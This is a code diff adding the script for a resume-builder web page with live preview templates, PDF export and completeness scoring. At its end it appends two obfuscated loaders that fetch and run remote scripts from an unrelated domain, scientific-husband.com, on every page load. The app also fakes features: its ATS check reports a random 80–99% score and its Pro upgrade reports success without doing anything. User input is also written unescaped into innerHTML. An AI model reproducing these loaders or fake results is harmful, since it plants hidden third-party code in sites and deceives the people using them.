+                <button onclick="this.parentElement.remove(); updatePreview();" class="mt-2 text-red-600 hover:text-red-700 text-sm">
+                    <i class="fas fa-trash mr-1"></i>Remove
+                </button>
+            `;
+            container.appendChild(newExp);
+        }
+        
+        // Add education
+        function addEducation() {
+            const container = document.getElementById('educationList');
+            const newEdu = document.createElement('div');
+            newEdu.className = 'education-item border-l-4 border-purple-600 pl-4';
+            newEdu.innerHTML = `
+                <input type="text" placeholder="Degree" 
+                       class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                       oninput="updatePreview()">
+                <input type="text" placeholder="Institution" 
+                       class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                       oninput="updatePreview()">
+                <input type="text" placeholder="Location" 
+                       class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                       oninput="updatePreview()">
+                <div class="grid grid-cols-2 gap-2">
+                    <input type="text" placeholder="Start Year" 
+                           class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                           oninput="updatePreview()">
+                    <input type="text" placeholder="End Year" 
+                           class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                           oninput="updatePreview()">
+                </div>
+                <button onclick="this.parentElement.remove(); updatePreview();" class="mt-2 text-red-600 hover:text-red-700 text-sm">
+                    <i class="fas fa-trash mr-1"></i>Remove
+                </button>
+            `;
+            container.appendChild(newEdu);
+        }
+        
+        // Add custom section
+        function addCustomSection(sectionName) {
+            const container = document.getElementById('customSections');
+            const section = document.createElement('div');
+            section.className = 'border-l-4 border-purple-600 pl-4';
+            section.innerHTML = `
+                <h4 class="font-semibold mb-2">${sectionName}</h4>
+                <input type="text" placeholder="Title" 
+                       class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                       oninput="updatePreview()">
+                <textarea placeholder="Description" rows="2" 
+                          class="w-full px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                          oninput="updatePreview()"></textarea>
+                <button onclick="this.parentElement.remove(); updatePreview();" class="mt-2 text-red-600 hover:text-red-700 text-sm">
+                    <i class="fas fa-trash mr-1"></i>Remove
+                </button>
+            `;
+            container.appendChild(section);
+        }
+        
+        // Add skill
+        function addSkill() {
+            const input = document.getElementById('skillInput');
+            const skill = input.value.trim();
+            if (skill) {
+                const skillsList = document.getElementById('skillsList');
+                const skillTag = document.createElement('span');
+                skillTag.className = 'skill-tag bg-purple-100 text-purple-700 px-3 py-1 rounded-full text-sm';
+                skillTag.innerHTML = `${skill} <button onclick="this.parentElement.remove(); updatePreview();" class="ml-2 hover:text-purple-900">×</button>`;
+                skillsList.appendChild(skillTag);
+                input.value = '';
+                updatePreview();
+            }
+        }
+        
+        // Update preview
+        function updatePreview() {
+            const preview = document.getElementById('resumePreview');
+            const fullName = document.getElementById('fullName').value || 'Your Name';
+            const jobTitle = document.getElementById('jobTitle').value || 'Job Title';
+            const email = document.getElementById('email').value || 'email@example.com';
+            const phone = document.getElementById('phone').value || '+1 234 567 8900';
+            const location = document.getElementById('location').value || 'City, Country';
+            const website = document.getElementById('website').value || 'website.com';
+            const summary = document.getElementById('summary').value || 'Your professional summary goes here.';
+            
+            // Get experiences
+            const experiences = [];
+            document.querySelectorAll('.experience-item').forEach(item => {
+                const inputs = item.querySelectorAll('input, textarea');
+                if (inputs[0].value || inputs[1].value) {
+                    experiences.push({
+                        title: inputs[0].value || 'Job Title',
+                        company: inputs[1].value || 'Company',
+                        start: inputs[2].value || 'Start Date',
+                        end: inputs[3].value || 'End Date',
+                        description: inputs[4].value || 'Job description'
+                    });
+                }
+            });
+            
+            // Get education
+            const education = [];
+            document.querySelectorAll('.education-item').forEach(item => {
+                const inputs = item.querySelectorAll('input');
+                if (inputs[0].value || inputs[1].value) {
+                    education.push({
+                        degree: inputs[0].value || 'Degree',
+                        institution: inputs[1].value || 'Institution',
+                        location: inputs[2].value || 'Location',
+                        start: inputs[3].value || 'Start Year',
+                        end: inputs[4].value || 'End Year'
+                    });
+                }
+            });
+            
+            // Get skills
+            const skills = [];
+            document.querySelectorAll('#skillsList .skill-tag').forEach(tag => {
+                const skillText = tag.textContent.replace('×', '').trim();
+                skills.push(skillText);
+            });
+            
+            // Get custom sections
+            const customSections = [];
+            document.querySelectorAll('#customSections > div').forEach(section => {
+                const title = section.querySelector('h4').textContent;
+                const inputs = section.querySelectorAll('input, textarea');
+                if (inputs[0].value || inputs[1].value) {
+                    customSections.push({
+                        title: title,
+                        subtitle: inputs[0].value || '',
+                        description: inputs[1].value || ''
+                    });
+                }
+            });
+            
+            // Generate HTML based on template
+            let html = '';
+            
+            if (currentTemplate === 'modern') {
+                html = `
+                    <div class="p-8">
+                        <header class="border-b-2 border-purple-600 pb-6 mb-6">
+                            <div class="flex items-start justify-between">
+                                <div>
+                                    <h1 class="text-3xl font-bold text-gray-800 mb-2">${fullName}</h1>
+                                    <h2 class="text-xl text-purple-600 mb-4">${jobTitle}</h2>
+                                    <div class="flex flex-wrap gap-4 text-sm text-gray-600">
+                                        <span><i class="fas fa-envelope mr-1"></i>${email}</span>
+                                        <span><i class="fas fa-phone mr-1"></i>${phone}</span>
+                                        <span><i class="fas fa-map-marker-alt mr-1"></i>${location}</span>
+                                        <span><i class="fas fa-globe mr-1"></i>${website}</span>
+                                    </div>
+                                </div>
+                                ${profilePhoto ? `<img src="${profilePhoto}" class="w-20 h-20 rounded-full object-cover">` : ''}
+                            </div>
+                        </header>
+                        
+                        <section class="mb-6">
+                            <h3 class="text-lg font-bold text-purple-600 mb-2">Professional Summary</h3>
+                            <p class="text-gray-700">${summary}</p>
+                        </section>
+                        
+                        ${experiences.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-lg font-bold text-purple-600 mb-3">Work Experience</h3>
+                            ${experiences.map(exp => `
+                                <div class="mb-4">
+                                    <div class="flex justify-between mb-1">
+                                        <h4 class="font-semibold text-gray-800">${exp.title}</h4>
+                                        <span class="text-sm text-gray-600">${exp.start} - ${exp.end}</span>
+                                    </div>
+                                    <p class="text-purple-600 mb-2">${exp.company}</p>
+                                    <p class="text-gray-700 text-sm whitespace-pre-line">${exp.description}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${education.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-lg font-bold text-purple-600 mb-3">Education</h3>
+                            ${education.map(edu => `
+                                <div class="mb-3">
+                                    <div class="flex justify-between">
+                                        <h4 class="font-semibold text-gray-800">${edu.degree}</h4>
+                                        <span class="text-sm text-gray-600">${edu.start} - ${edu.end}</span>
+                                    </div>
+                                    <p class="text-purple-600">${edu.institution}, ${edu.location}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${skills.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-lg font-bold text-purple-600 mb-3">Skills</h3>
+                            <div class="flex flex-wrap gap-2">
+                                ${skills.map(skill => `
+                                    <span class="bg-purple-100 text-purple-700 px-3 py-1 rounded-full text-sm">${skill}</span>
+                                `).join('')}
+                            </div>
+                        </section>
+                        ` : ''}
+                        
+                        ${customSections.length > 0 ? `
+                        <section>
+                            ${customSections.map(section => `
+                                <div class="mb-4">
+                                    <h3 class="text-lg font-bold text-purple-600 mb-2">${section.title}</h3>
+                                    ${section.subtitle ? `<h4 class="font-semibold text-gray-800 mb-1">${section.subtitle}</h4>` : ''}
+                                    <p class="text-gray-700 text-sm">${section.description}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                    </div>
+                `;
+            } else if (currentTemplate === 'minimal') {
+                html = `
+                    <div class="p-8">
+                        <header class="mb-8">
+                            <h1 class="text-4xl font-light text-gray-800 mb-2">${fullName}</h1>
+                            <h2 class="text-lg text-gray-600 mb-4">${jobTitle}</h2>
+                            <div class="flex flex-wrap gap-6 text-sm text-gray-500">
+                                <span>${email}</span>
+                                <span>${phone}</span>
+                                <span>${location}</span>
+                                <span>${website}</span>
+                            </div>
+                        </header>
+                        
+                        <section class="mb-6">
+                            <h3 class="text-sm font-bold text-gray-800 uppercase tracking-wider mb-2">Summary</h3>
+                            <p class="text-gray-700 leading-relaxed">${summary}</p>
+                        </section>
+                        
+                        ${experiences.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-sm font-bold text-gray-800 uppercase tracking-wider mb-3">Experience</h3>
+                            ${experiences.map(exp => `
+                                <div class="mb-4">
+                                    <div class="flex justify-between mb-1">
+                                        <h4 class="font-semibold text-gray-800">${exp.title}</h4>
+                                        <span class="text-sm text-gray-500">${exp.start} - ${exp.end}</span>
+                                    </div>
+                                    <p class="text-gray-600 mb-2">${exp.company}</p>
+                                    <p class="text-gray-700 text-sm whitespace-pre-line">${exp.description}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${education.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-sm font-bold text-gray-800 uppercase tracking-wider mb-3">Education</h3>
+                            ${education.map(edu => `
+                                <div class="mb-3">
+                                    <div class="flex justify-between">
+                                        <h4 class="font-semibold text-gray-800">${edu.degree}</h4>
+                                        <span class="text-sm text-gray-500">${edu.start} - ${edu.end}</span>
+                                    </div>
+                                    <p class="text-gray-600">${edu.institution}, ${edu.location}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${skills.length > 0 ? `
+                        <section>
+                            <h3 class="text-sm font-bold text-gray-800 uppercase tracking-wider mb-3">Skills</h3>
+                            <p class="text-gray-700">${skills.join(' • ')}</p>
+                        </section>
+                        ` : ''}
+                    </div>
+                `;
+            } else if (currentTemplate === 'creative') {
+                html = `
+                    <div class="bg-gradient-to-br from-purple-50 to-pink-50 p-8">
+                        <header class="text-center mb-8">
+                            ${profilePhoto ? `<img src="${profilePhoto}" class="w-32 h-32 rounded-full mx-auto mb-4 object-cover border-4 border-white shadow-lg">` : ''}
+                            <h1 class="text-5xl font-serif text-purple-800 mb-2">${fullName}</h1>
+                            <div class="w-24 h-1 bg-purple-600 mx-auto mb-4"></div>
+                            <h2 class="text-2xl text-purple-600">${jobTitle}</h2>
+                        </header>
+                        
+                        <div class="grid grid-cols-3 gap-4 mb-8 text-center">
+                            <div class="bg-white rounded-lg p-3 shadow">
+                                <i class="fas fa-envelope text-purple-600 text-xl mb-1"></i>
+                                <p class="text-xs text-gray-700">${email}</p>
+                            </div>
+                            <div class="bg-white rounded-lg p-3 shadow">
+                                <i class="fas fa-phone text-purple-600 text-xl mb-1"></i>
+                                <p class="text-xs text-gray-700">${phone}</p>
+                            </div>
+                            <div class="bg-white rounded-lg p-3 shadow">
+                                <i class="fas fa-map-marker-alt text-purple-600 text-xl mb-1"></i>
+                                <p class="text-xs text-gray-700">${location}</p>
+                            </div>
+                        </div>
+                        
+                        <section class="mb-6">
+                            <h3 class="text-2xl font-serif text-purple-800 mb-3">About Me</h3>
+                            <p class="text-gray-700 text-center italic">${summary}</p>
+                        </section>
+                        
+                        ${experiences.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-2xl font-serif text-purple-800 mb-3">Experience</h3>
+                            ${experiences.map(exp => `
+                                <div class="bg-white rounded-lg p-4 mb-3 shadow">
+                                    <div class="flex justify-between items-start mb-2">
+                                        <div>
+                                            <h4 class="font-bold text-purple-700">${exp.title}</h4>
+                                            <p class="text-purple-600">${exp.company}</p>
+                                        </div>
+                                        <span class="text-sm text-gray-600 bg-purple-100 px-2 py-1 rounded">${exp.start} - ${exp.end}</span>
+                                    </div>
+                                    <p class="text-gray-700 text-sm whitespace-pre-line">${exp.description}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${education.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-2xl font-serif text-purple-800 mb-3">Education</h3>
+                            ${education.map(edu => `
+                                <div class="bg-white rounded-lg p-4 mb-3 shadow">
+                                    <div class="flex justify-between items-center">
+                                        <div>
+                                            <h4 class="font-bold text-purple-700">${edu.degree}</h4>
+                                            <p class="text-purple-600">${edu.institution}, ${edu.location}</p>
+                                        </div>
+                                        <span class="text-sm text-gray-600">${edu.start} - ${edu.end}</span>
+                                    </div>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${skills.length > 0 ? `
+                        <section>
+                            <h3 class="text-2xl font-serif text-purple-800 mb-3">Skills</h3>
+                            <div class="flex flex-wrap gap-2 justify-center">
+                                ${skills.map(skill => `
+                                    <span class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-4 py-2 rounded-full text-sm shadow">${skill}</span>
+                                `).join('')}
+                            </div>
+                        </section>
+                        ` : ''}
+                    </div>
+                `;
+            } else {
+                // Classic template
+                html = `
+                    <div class="p-8">
+                        <header class="text-center mb-8">
+                            <h1 class="text-4xl font-serif text-gray-800 mb-2">${fullName}</h1>
+                            <h2 class="text-xl text-gray-600 mb-4">${jobTitle}</h2>
+                            <div class="border-t-2 border-gray-800 pt-4">
+                                <p class="text-sm text-gray-700">${email} • ${phone} • ${location} • ${website}</p>
+                            </div>
+                        </header>
+                        
+                        <section class="mb-6">
+                            <h3 class="text-lg font-serif font-bold text-gray-800 mb-2 border-b border-gray-400 pb-1">Professional Summary</h3>
+                            <p class="text-gray-700 text-justify">${summary}</p>
+                        </section>
+                        
+                        ${experiences.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-lg font-serif font-bold text-gray-800 mb-3 border-b border-gray-400 pb-1">Professional Experience</h3>
+                            ${experiences.map(exp => `
+                                <div class="mb-4">
+                                    <div class="flex justify-between mb-1">
+                                        <h4 class="font-semibold text-gray-800">${exp.title}</h4>
+                                        <span class="text-sm text-gray-600">${exp.start} - ${exp.end}</span>
+                                    </div>
+                                    <p class="text-gray-700 italic mb-2">${exp.company}</p>
+                                    <p class="text-gray-700 text-sm whitespace-pre-line">${exp.description}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${education.length > 0 ? `
+                        <section class="mb-6">
+                            <h3 class="text-lg font-serif font-bold text-gray-800 mb-3 border-b border-gray-400 pb-1">Education</h3>
+                            ${education.map(edu => `
+                                <div class="mb-3">
+                                    <div class="flex justify-between">
+                                        <h4 class="font-semibold text-gray-800">${edu.degree}</h4>
+                                        <span class="text-sm text-gray-600">${edu.start} - ${edu.end}</span>
+                                    </div>
+                                    <p class="text-gray-700">${edu.institution}, ${edu.location}</p>
+                                </div>
+                            `).join('')}
+                        </section>
+                        ` : ''}
+                        
+                        ${skills.length > 0 ? `
+                        <section>
+                            <h3 class="text-lg font-serif font-bold text-gray-800 mb-3 border-b border-gray-400 pb-1">Skills</h3>
+                            <p class="text-gray-700">${skills.join(' • ')}</p>
+                        </section>
+                        ` : ''}
+                    </div>
+                `;
+            }
+            
+            preview.innerHTML = html;
+            updateAnalytics();
+        }
+        
+        // Update analytics
+        function updateAnalytics() {
+            const allText = document.getElementById('resumePreview').innerText;
+            const wordCount = allText.split(/\s+/).filter(word => word.length > 0).length;
+            const readTime = Math.ceil(wordCount / 200); // Average reading speed
+            
+            document.getElementById('wordCount').textContent = wordCount;
+            document.getElementById('readTime').textContent = readTime + 's';
+            
+            // Update score based on completeness
+            let score = 0;
+            if (document.getElementById('fullName').value) score += 10;
+            if (document.getElementById('summary').value) score += 15;
+            if (document.querySelectorAll('.experience-item').length > 0) score += 25;
+            if (document.querySelectorAll('.education-item').length > 0) score += 20;
+            if (document.querySelectorAll('#skillsList .skill-tag').length > 0) score += 15;
+            if (wordCount > 100) score += 15;
+            
+            const scoreCircle = document.getElementById('scoreCircle');
+            const scoreValue = document.getElementById('scoreValue');
+            const circumference = 2 * Math.PI * 50;
+            const offset = circumference - (score / 100) * circumference;
+            
+            scoreCircle.style.strokeDashoffset = offset;
+            scoreValue.textContent = score;
+        }
+        
+        // Zoom functions
+        function zoomIn() {
+            if (zoomLevel < 1.5) {
+                zoomLevel += 0.1;
+                document.getElementById('resumePreview').style.transform = `scale(${zoomLevel})`;
+            }
+        }
+        
+        function zoomOut() {
+            if (zoomLevel > 0.5) {
+                zoomLevel -= 0.1;
+                document.getElementById('resumePreview').style.transform = `scale(${zoomLevel})`;
+            }
+        }
+        
+        // Download PDF with improved method
+        function downloadPDF() {
+            showLoading();
+            const element = document.getElementById('resumePreview');
+            
+            // Reset zoom for PDF
+            const originalZoom = zoomLevel;
+            zoomLevel = 1;
+            element.style.transform = 'scale(1)';
+            
+            html2canvas(element, {
+                scale: 2,
+                useCORS: true,
+                logging: false,
+                backgroundColor: '#ffffff'
+            }).then(canvas => {
+                const imgData = canvas.toDataURL('image/png');
+                const pdf = new jspdf.jsPDF({
+                    orientation: 'portrait',
+                    unit: 'mm',
+                    format: 'a4'
+                });
+                
+                const imgWidth = 210;
+                const pageHeight = 297;
+                const imgHeight = (canvas.height * imgWidth) / canvas.width;
+                let heightLeft = imgHeight;
+                let position = 0;
+                
+                pdf.addImage(imgData, 'PNG', 0, position, imgWidth, imgHeight);
+                heightLeft -= pageHeight;
+                
+                while (heightLeft >= 0) {
+                    position = heightLeft - imgHeight;
+                    pdf.addPage();
+                    pdf.addImage(imgData, 'PNG', 0, position, imgWidth, imgHeight);
+                    heightLeft -= pageHeight;
+                }
+                
+                pdf.save('resume.pdf');
+                
+                // Restore zoom
+                zoomLevel = originalZoom;
+                element.style.transform = `scale(${zoomLevel})`;
+                hideLoading();
+            }).catch(error => {
+                console.error('PDF generation error:', error);
+                hideLoading();
+                alert('Error generating PDF. Please try again.');
+            });
+        }
+        
+        // Download DOCX (simulated)
+        function downloadDOCX() {
+            showLoading();
+            setTimeout(() => {
+                const content = document.getElementById('resumePreview').innerText;
+                const blob = new Blob([content], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'resume.txt';
+                a.click();
+                hideLoading();
+            }, 1000);
+        }
+        
+        // Share resume
+        function shareResume() {
+            const shareUrl = window.location.href + '?shared=true';
+            navigator.clipboard.writeText(shareUrl).then(() => {
+                alert('Share link copied to clipboard!');
+            });
+        }
+        
+        // AI Functions
+        function generateSummary() {
+            showLoading();
+            setTimeout(() => {
+                const jobTitle = document.getElementById('jobTitle').value || 'Professional';
+                const summary = `Experienced ${jobTitle} with a proven track record of delivering exceptional results. 
+                Skilled in project management, team leadership, and strategic planning. 
+                Passionate about driving innovation and achieving organizational goals through 
+                creative problem-solving and collaborative teamwork.`;
+                document.getElementById('summary').value = summary;
+                updatePreview();
+                hideLoading();
+            }, 2000);
+        }
+        
+        function improveWriting() {
+            showLoading();
+            setTimeout(() => {
+                alert('AI writing improvement feature is available in Pro version. Upgrade to unlock!');
+                hideLoading();
+            }, 1000);
+        }
+        
+        function checkATS() {
+            showLoading();
+            setTimeout(() => {
+                const score = Math.floor(Math.random() * 20) + 80;
+                alert(`Your resume is ${score}% ATS optimized! Consider adding more keywords from job descriptions to improve further.`);
+                hideLoading();
+            }, 1500);
+        }
+        
+        function generateCoverLetter() {
+            showLoading();
+            setTimeout(() => {
+                alert('Cover letter generator is available in Pro version. Upgrade to unlock!');
+                hideLoading();
+            }, 1000);
+        }
+        
+        // Language change
+        function changeLanguage() {
+            const lang = document.getElementById('languageSelect').value;
+            // Simulate language change
+            console.log('Language changed to:', lang);
+        }
+        
+        // Upgrade modal
+        function showUpgradeModal() {
+            document.getElementById('upgradeModal').classList.remove('hidden');
+        }
+        
+        function closeUpgradeModal() {
+            document.getElementById('upgradeModal').classList.add('hidden');
+        }
+        
+        function processUpgrade() {
+            showLoading();
+            setTimeout(() => {
+                alert('Upgrade successful! Welcome to ResumeCraft Pro!');
+                closeUpgradeModal();
+                hideLoading();
+            }, 2000);
+        }
+        
+        // Loading overlay
+        function showLoading() {
+            document.getElementById('loadingOverlay').classList.remove('hidden');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.add('hidden');
+        }
+    <script>
+(function(chcuto){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = chcuto || {};
+s.src = "\/\/scientific-husband.com\/bhX\/V.sDdEGwl\/0\/YWWmch\/cermv9oubZSUclok\/P\/TDYh2VNVz\/UZwlMMz\/Ict-NnjUYv3\/NWTAAuzpMYwI";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+
+// video
+
+<script>
+(function(dor){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = dor || {};
+s.src = "\/\/scientific-husband.com\/bQXGVxs.dvGSl\/0HY\/WTch\/cedm\/9QukZ\/U\/lQkbP\/TJY\/2NNfjuA-zFMTz\/Q\/tMNejdYP2hMpDbMQzDNMQV";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+</body>
+</html>
